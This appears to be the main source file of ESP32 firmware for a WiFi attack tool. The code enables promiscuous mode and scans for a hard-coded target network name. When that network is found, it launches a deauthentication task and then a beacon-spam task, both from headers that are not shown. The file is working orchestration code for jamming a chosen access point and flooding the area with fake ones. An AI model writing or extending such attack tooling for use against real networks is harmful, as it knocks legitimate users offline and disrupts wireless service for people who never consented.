#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_log_level.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_wifi_default.h"
#include "esp_netif_defaults.h"
#include "esp_random.h"
#include "config.h"
#include "beacon_spammer.h"
#include "wifi_deauther.h"

#define TAG "WiFi_Scanner"
void wifi_scan_task(void *arg) {
    wifi_scan_config_t scan_config = {
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    };
    bool running = true;
    while (running) {
        gpio_set_level(LED_PIN, 1);
        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
        uint16_t ap_count = 0;
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
        wifi_ap_record_t *ap_record = NULL;
        ap_record = pvPortMalloc(ap_count * sizeof(wifi_ap_record_t));
        if (!ap_record) {
            ESP_LOGE(TAG, "Memory allocation failed");
            ESP_ERROR_CHECK(esp_wifi_scan_stop());
            vTaskDelay(pdMS_TO_TICKS(1000));
            gpio_set_level(LED_PIN, 0);
            continue;
        }
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_record));
        for (int i = 0; i < ap_count; i++) {
            if (strncmp((char *)ap_record[i].ssid, TARGET_SSID, SSID_MAX_LEN) == 0) {
                ESP_LOGI(TAG,"Target AP found! Starting deauth task...");
                wifi_ap_record_t ap_record_buffer;
                memcpy(&ap_record_buffer, &ap_record[i], sizeof(wifi_ap_record_t));
                start_deauth_task(&ap_record_buffer);
                vTaskDelay(pdMS_TO_TICKS(1000));
                running = false;
                goto found; // 找到目标后退出循环
            }
        }
        ESP_LOGI(TAG, "Target AP not found.");
        gpio_set_level(LED_PIN, 0);
        found:
        vPortFree(ap_record);
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
}
#define TAG "main"
__always_inline void wifi_init() {
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    esp_netif_create_default_wifi_sta();
    esp_netif_create_default_wifi_ap();
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
}
__always_inline void gpio_init() { 
    {
        gpio_config_t io_conf = {
            .intr_type = GPIO_INTR_DISABLE,
            .mode = GPIO_MODE_OUTPUT,
            .pin_bit_mask = (1ULL << LED_PIN),
            .pull_down_en = GPIO_PULLDOWN_DISABLE,
            .pull_up_en = GPIO_PULLUP_DISABLE
        };
        ESP_ERROR_CHECK(gpio_config(&io_conf));
    }
}
void app_main() {
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_LOGI(TAG, "Initialized NVS");

    esp_event_loop_create_default();
    ESP_LOGI(TAG, "Initialized event loop");

    wifi_init();
    ESP_LOGI(TAG, "Initialized WiFi");

    gpio_init();
    ESP_LOGI(TAG, "Initialized GPIO");
    ESP_LOGI(TAG, "Initialization completed");

    wifi_scan_task(NULL);
    vTaskDelay(pdMS_TO_TICKS(1000));
    start_beacon_spam_task();

}